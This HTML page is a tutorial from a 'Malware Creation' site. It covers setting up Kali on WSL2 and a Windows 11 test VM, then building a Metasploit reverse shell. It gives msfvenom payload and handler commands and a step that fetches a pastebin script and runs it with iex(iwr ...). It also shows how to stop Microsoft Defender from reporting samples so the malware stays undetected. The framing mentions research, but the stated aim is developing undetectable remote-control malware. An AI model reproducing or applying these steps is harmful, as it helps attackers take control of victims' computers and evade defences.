<!DOCTYPE html>
<html lang="en-US">

<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="style.css" />

    <title>
        Setting up Development Environment for Malware Creation
    </title>
</head>

<body>
    <header>
        <div class="container">
            <a id="a-title" href="home.html">
                <h1>Malware Creation</h1>
            </a>
            <h2>Development Environment</h2>

        </div>
    </header>

    <div class="container">
        <section id="main_content">
            <h1>
                Setting up Development Environment
            </h1>

            <h2 id="OverView">Overview</h2>

            <ol>
                <li><a href="#Kali">Setting Up Kali in Windows and Integrating VSCode</a></li>
                <li><a href="#Windows">Setting Up Isolated Testing VM</a></li>
                <li><a href="#Reverse">Creating Reverse Shell and Running on Testing Environment</a></li>
            </ol>
            </p>
            <section id="Intro">
                <h2>
                    Introduction
                </h2>
                <p>
                    As cyber attacks become increasingly prevalent and sophisticated, it's more important than ever for security researchers and professionals to have the tools and knowledge to detect, analyze, and defend against malware. One powerful tool in this effort
                    is Kali Linux, a popular penetration testing platform that provides a wide range of tools and techniques for identifying and exploiting vulnerabilities in computer systems.
                </p>
                <p>
                    In this guide, we'll walk you through the process of setting up a Kali Linux environment on Windows Subsystem for Linux 2 (WSL2) and installing Visual Studio Code (VS Code) on it. We'll then cover how to set up a virtual machine using VirtualBox to safely
                    test malware in an isolated environment. Finally, we'll cover how to use Metasploit, an open-source penetration testing framework, to create a basic reverse shell that can be used to control a victim's computer remotely.
                </p>
                <p>
                    By the end of this guide, you'll have a better understanding of how to use Kali Linux and other tools to identify and defend against malware, and how to create a safe and controlled environment for testing and research purposes. <br><br>                    Let's get started!
                </p>
            </section>

            <section id="Kali">
                <h2>Setting Up Kali Linux in Windows and Integrating VSCode</h2>
                <br>
                <h3>why</h3>
                <p>We are going to initialling install Kali-Linux on WSL2. This is a full linux kernel running along side of windows. I have used Virtual-Box and other VM software to do this in the past however it is a pain loading up the VM to do a small
                    task every time you need to move over to linux. The bonus with WSL2 is that it allows linux to run in a console environment but then run Visual Studio Code on windows but through kali linux as the server.
                </p>
                <img style="width:fit-content" src="img/architecture-wsl.png" alt="Diagram of how WSL and VSCode work">
                <p>
                    As mentioned, for testing the malware it is better to run in its own environment this will be the Windows 11 VM that i spoke of before. We will have custom scripts to make testing easier and it should be as simple as clicking on a shortcut in the VM
                    <img style="float: right; padding-left: 3em; height: 15em" src="img/winver.png" alt="">
                </p>
                <br>
                <h3>how</h3>
                <p>!!! To install kali-linux on windows through WSL2 you will need to be running windows 10 version 2004 or higher <br>to check this press <i><b>WIN + r</b></i> and in the popup type <b><i>winver</i></b></p>
                <ul>
                    <li>Open PowerShell as administrator and run:</li>
                </ul>
                <pre><code>Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</code></pre>
                <ul>
                    <li>
                        <p>Restart</p>
                    </li>
                    <li>
                        <p>Open PowerShell as administrator and run:</p>
                    </li>
                </ul>
                <pre><code>dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</code></pre>
                <ul>
                    <li>Restart</li>
                    <li>Open PowerShell as administrator and run:
                        <pre><code>wsl --set-default-version 2</code></pre>
                    </li>
                    <p style="margin-block: 0px;">if this fails then check steps before and windows version is above 2004</p>
                    <li>Then enter: <br>
                        <pre style="margin-bottom: 0px;"><code>wsl --install kali-linux</code></pre>
                    </li><br>

                    <details>
                        <summary>
                            <span class="icon">ðŸ‘‡</span> If this doesn't work then manually use Microsoft Store to install
                            <span class="icon">ðŸ‘‡</span>
                        </summary>
                        <p>To install Kali on WSL2 without winget then do it manually</p>
                        <ol>
                            <li>
                                Open start menu and type <b><i>Store</i></b> and enter
                            </li>
                            <img style="height: 25em;" src="img/openstore.png" alt="">
                            <li>
                                Search for kali on top search bar
                            </li>
                            <img style="height: 25em;" src="img/kalisearch.png" alt="">
                            <li>
                                Install Kali by pressing Get
                            </li>
                            <img style="height: 25em;" src="img/kaliget.png" alt="">
                        </ol>
                    </details>
                    <br>
                    <li>Run Kali from start menu and finish the initial setup:</li>
                    <div style="padding-right: 1em; padding-left: 1em;">
                        <p>When typing password shown where arrows point nothing will show up but it is being stored and works as normal. <br> You will need to re-enter password as shown in screenshot</p>
                        <img style="border: 1px solid #cdfeaa" src="img/kalisetup.png" alt="">
                    </div>
                </ul>
                <h3>Installing Visual Studio Code</h3>
                <p>Installing Visual Studio Code server on Kali is simple if you already have Visual Studio Code installed on your windows install </p>
                <details>
                    <summary>
                        <span class="icon">ðŸ‘‡</span> If Visual Studio Code not installed
                        <span class="icon">ðŸ‘‡</span>
                    </summary>
                    <ol>
                        <li>
                            Go to VS Code <a href="https://code.visualstudio.com/download">Download Page</a> and Press Windows Download
                        </li>
                        <img style="min-height: fit-content;" src="img/vscodewindows.png" alt="">
                        <li>Then run the Installer and follow instructions</li>
                    </ol>
                    <p>Now Follow rest of instructions below</p>
                </details>
                <p><br>With VS Code Installed:<br></p>

                <ol>
                    <li>Launch Kali from start menu same as before</li>
                    <li>Once launched enter:</li>
                    <pre><code>code .</code></pre>
                    <p>This will install VSCode Server and then launch VSCode inside windows as a client</p>
                    <img style="border: 1px solid #cdfeaa;" src="img/VSCodeServer.png" alt="">
                </ol>
                <p>VS Code will launch and you will see the linux folder system within VS Code</p>

                <br>
                <h3>--Installing MetaSploit--</h3>
                <br>
                <h3>why</h3>
                <p>MetaSploit is a open source program that allows users to create custom payloads, which are small programs that can run on a target system to do things like gather information or run commands. This feature makes Metasploit a flexible tool
                    for security testing and vulnerability analysis.</p>
                <br>
                <h3>how</h3>
                <ol>
                    <li>Run MetaSploit install command</li>
                    <pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
</code></pre>
                    <li>Then launch MetaSploit and run first time startup</li>
                    <pre><code>msfconsole</code></pre>
                    <li>If it asks if you want to setup database enter: y <br> If it asks if you want to setup webservice enter: n</li>
                </ol>
                <p>After this MetaSploit is installed on your Kali WSL2 we can begin to use it to create malware</p>
                <br>
            </section>

            <section id="Windows">
                <h2>Setting Up Isolated Testing VM</h2>
                <br>
                <h3>Why</h3>

                <p>When developing malware it can be appealing to test malware your own host. This seems safe with the cloud sample submission turned of in the AV(for this guide we will be testing against Microsoft Defender however techniques transfer).
                    This stops the metadata of your malware from being uploaded to Microsoft Defender Servers and tagged. However, the metadata is still collected and when cloud sample submissions is turned back on automatically this metadata is then
                    uploaded ruining your progress.</p>
                <p>
                    Before learning this I set back my own development development when I had a undetectable reverse shell (remote control malware). I then did something suspicious using it and Defender removed it. Couple days later I tested it again and even though Defender
                    was not sending the metadata to Microsoft at the time, 2 days later the cloud protection enabled itself and my malware was shared and tagged by Microsoft Defender. The problem with this is that defender still collects metadata to be
                    sent back to windows but it holds of sending them. The main problem is that then it submits this metadata to Microsoft after the setting is re-enabled.
                </p>

                <p>
                    To get around this when developing malware we use an isolated Virtual Machine. This is free but the VM license lasts only 90 days. The process below will need repeated however it is best to keep the version you are testing on up to date anyway was you
                    will be constantly resetting it to get around delayed Microsoft Defender upload.
                </p>

                <br>
                <h3>how</h3>
                <ol>
                    <li>Install Virtual Box</li>
                    <ol>
                        <li>Go to Virtual Box Website <a href="https://www.virtualbox.org/wiki/Downloads">Download Page</a> and Click Windows Hosts</li>
                        <p style="margin-block: 0px">(this is the program used to run windows virtual machine)</p>
                        <img src="img/VBdownload.png" alt="">
                        <li>Run the downloaded installer and click through installation</li>
                        <p style="margin-block: 0px">(make sure you have virtualization enabled in your BIOS)</p>
                    </ol>
                    <li>Download Windows 11 development environment file for Virtual Box</li>
                    <p style="margin-block: 0px">(this is a pre-configured windows install in Virtual Box)</p>
                    <ol>
                        <li>Go to <a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/">Download
                Page</a></li>
                        <li>Click on VirtualBox install button to get zip file</li>
                        <img style="padding-top: 1em;" src="img/windownload.png" alt="">
                        <li>Extract the zip file and place .ova file (configured VM) in folder that won't be deleted</li>
                    </ol>
                    <li>Import Windows 11 VM config into VirtualBox</li>
                    <ol>
                        <li>Open VirtualBox and select <b><i>File > Import Appliance</i></b></li>
                        <img src="img/Import.png" alt="Image of button to import">
                        <li>Select the Windows VM file downloaded before</li>
                        <li>Click next and then finish</li>
                    </ol>
                    <li>Adding Shared Folder</li>
                    <ol>
                        <li>You now will see the Windows VM available to select</li>
                        <li>Right click and hit <b><i>settings</i></b></li>
                        <li>Navigate to Shared Folder tab and hit folder icon on right with green plus
                            <img style="max-height: 25em" src="img/SharedFolder.png" alt="Shared Folder Icon">
                        </li>
                        <li>Select folder to be shared with VM by clicking dropdown arrow and then Other</li>
                        <img src="img/addshared.png" alt="">
                        <li>Browse to Documents and hit new folder at top and name it WindowsShared then hit select</li>
                        <p style="margin-block: 0px">This folder is where you should put your binaries to be tested on windows vm
                        </p>
                    </ol>
                    <li>Disabling Tamper Protection</li>
                    <ol>
                        <li>Hit windows button and search for <b><i>Virus & Threat Protection</i></b></li>
                        <li><b><i>Virus & Threat Detection Settings</i></b> hit <b><i>Manage Settings</i></b></li>
                        <img src="img/VirusThreatProtectionmanage.png" alt="">
                        <li>Disable Tamper Protection by pressing the switch</li>
                        <img src="img/tamperprotections.png" alt="">
                        <li>Should then be pop-up asking for permission <b><i>Click Yes</i></b></li>
                        <p style="margin-block: 0px">This allows the script later on to disable and enable features without the AV stopping it
                        </p>
                    </ol>
                    <li>Adding Exclusion to Shared Folder</li>
                    <ol>
                        <li>While still in <b><i>Virus & Threat Detection Settings</i></b></li>
                        <li>At bottom of the page click <i><b>Add or Remove Exclusions</b></i></li>
                        <img src="img/exclusions.png" alt="">
                        <li>On Pop-Up hit add exclusion and select folder that you created called <i><b>WindowsShared</b></i></li>
                        <p style="margin-block: 0px">This will make the folder that your put your malware in hidden from Defender
                        </p>
                    </ol>
                    <li>Setting Up Windows 11 VM for testing</li>
                    <ol>
                        <li>Launch your VM by Clicking Start with it selected in VirtualBox</li>
                        <li>Once it is launched click start button and search <i><b>powershell</b></i></li>
                        <img src="img/powershell.png" alt="">
                        <li>Then click <i><b>Run as Administrator</b></i> (click yes to popup)</li>
                        <li>Then in the Powershell window run this command</li>
                        <pre style="padding-left: 3em; padding-right: 3em; padding-top: 0px;">iex((iwr http://pastebin.com/raw.php?i=cGXjGGLT).content)</pre>
                        <p style="margin-block: 0px">This will set up to Virtual Machine and add 2 Shortcuts too the Desktop</p>
                        <p style="margin-block: 0px">One runs the malware with AV the other runs it without AV</p>
                        </br>
                        <h4>Usage</h4>
                    </ol>
                    <ol>
                        <li>On your host put the binary to be executed in <b><i>WindowsShared Folder</i></b> from earlier and name it test.exe</li>
                        <li>Then launch the vm and click on either of the Shortcuts</li>
                        <p style="margin-block: 0px">This updates Defender and copies malware then runs it or runs it with defender cloud <b>disable</b></p>
                    </ol>
                    <br>
                    <li>Creating Snapshot of VM</li>
                    <p>When testing your malware on the VM with cloud submission turned off the metadata of your malware is uploaded in couple days when it turns itself back on. To get around this we need to run the malware as many times as we want then
                        next time we turn VM on again we need to reset to prior state before the last test. To do this we will use <b><i>Snapshots</i></b> this will allow us to save the machine and then go back to exactly how it was at that stage. </br>
                        This is how to set this up:</p>
                    <ol>
                        <img style="float: right; padding-right: 5em;" src="img/Snapshots.png" alt="Image of button to Snapshots">
                        <li>After Setting up VM power it off</li>
                        <li>Then go to snapshots in VirtualBox</li>
                        <li>Then in that tab click the take button with green plus</li>
                        <li>Name the snapshot <b><i>Restore Point</i></b></li>
                        <p>Then every time you want to open the VM go to <b><i>Snapshot tab and click restore <br> That resets the
                  VM and then more malware can be tested and nothing is sent to Microsoft</i></b></p>
                    </ol>
                </ol>



            </section>

            <section id="Reverse">
                <h2>Creating Reverse Shell and Running on Testing Environment</h2>
                <br>
                <h3>why</h3>
                <p>
                    A reverse shell is a tool used by hackers to control a PC remotely after the user runs the malware. This is done by putting a program on the pc and getting the user to run it. This program calls back to the hackers pc over a range of different network
                    protocols. In the real world hackers use external IP addresses to communicate but since we have our own local testing VM we are going to use their local IP addresses. There are many ways to create this program but a common starter
                    and in some cases even used in advanced pentesting is MetaSploit. This will show you how to go about creating a simple reverse shell that will be detected but it is a good place to start.
                </p>
                <img style="border: 2px solid #cdfeaa; display: block; margin-left: auto; margin-right: auto;" src="img/reverse-TCP-shell.png" alt="">
                <p>Diagram of Reverse TCP shell</p>
                <br>
                <h3>how</h3>
                <ol>
                    <li>Generate the executable payload</li>
                    <p>Before we generate the payload we must find what our kali boxes IP address is. To do this run the following command
                    </p>
                    <pre><code>ifconfig</code></pre>
                    <img style="border: 1px solid #cdfeaa; width:max-content" src="img/ifconfig.png" alt="">
                    <p>The IP address is the number beside inet in this case: 172.24.95.17 <br>Store this for use later</p>
                    <li>On kali box run msfvenom, this uses metaspoit to create new malware in one line</li>
                    <p>Replace REPLACEME with your kali IP address from above</p>
                    <pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=REPLACEME lport=4444 X > ./test.exe</code></pre>
                    <p>There should now be a file called test.exe in your linux box</p>
                    <li>Copy the executable payload to Testing VM</li>
                    <p>The malware is now in your kali home directory (bit like windows user folder) To copy this over to VM for testing we need to move to previously created WindowsShared folder <br> The command to do this is:</p>
                    <pre><code>sudo cp ./test.exe "/mnt/c/Users/WINUSERNAME/Documents/WindowsShared"</code></pre>

                    <li>Setup the payload handler on Kali box</li>
                    <p>The Attacker must have a program waiting on the connection from the malware. We use MetaSploit for this by launching it and running these commands</p>
                    <p>Replace REPLACEME with your kali IP address from above</p>
                    <pre><code>$ ./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost REPLACEME
msf exploit(handler) > set lport 4444
msf exploit(handler) > run</code></pre>
                    <p>After putting <b><i>run</i></b> command in the kali box is now listening (waiting) for a connection from the malware</p>

                    <li>Running the malware on isolated Windows VM</li>
                    <p>First reset your Windows VM to the snapshot <b><i>Restore Point</i></b></p>
                    <p>Then launch VM and run the Test without AV Shortcut</p>
                </ol>
                This will run the malware and on the Kali box you should see the result
                <pre><code>[*] Sending stage (770048 bytes) to 192.168.1.80
[*] Meterpreter session 1 opened (192.168.1.123:4444 -> 192.168.1.80:1138) at 2014-10-22 19:03:43 -0500
meterpreter ></code></pre>
                <p>or something similar. <br> This means that you have successfully created your first virus and can now control your windows VM.</p>
                <p>Don't forget to reset box each time you start it when developing malware or windows will learn of your developments and block them.</p>
            </section>
        </section>
    </div>
    <hr>
    <footer>
        <nav>
            <a href="index.html" class="footer-link" id="bottom-link-alt">Home</a>
            <a href="developmentsetup.html" class="footer-link" id="bottom-link">Development and Testing Setup</a>
            <a href="antivirusfactfile.html" class="footer-link" id="bottom-link">Antivirus Fact File</a>
            <a href="WindowsAPl.html" class="footer-link" id="bottom-link-alt">Windows API</a>
            <a href="processesthreadshandles.html" class="footer-link" id="bottom-link-alt">Processes, Threads, and Handles</a>
            <a href="processinjection.html" class="footer-link" id="bottom-link">Process Injection</a>
            <a href="Dynamiclmports.html" class="footer-link" id="bottom-link">Dynamic Imports</a>
            <a href="installingnim.html" class="footer-link" id="bottom-link-alt">Installing Nim</a>
            <a href="basicnimshell.html" class="footer-link" id="bottom-link-alt">Basic Nim Shell</a>
            <a href="obfuscatingnimshell.html" class="footer-link" id="bottom-link">Obfuscating Nim Shell</a>
            <a href="customencoder.html" class="footer-link" id="bottom-link">Custom Encoder</a>
            <a href="Nimjector.html" class="footer-link" id="bottom-link-alt">Custom Modular Malware</a>
        </nav>
    </footer>
</body>

</html>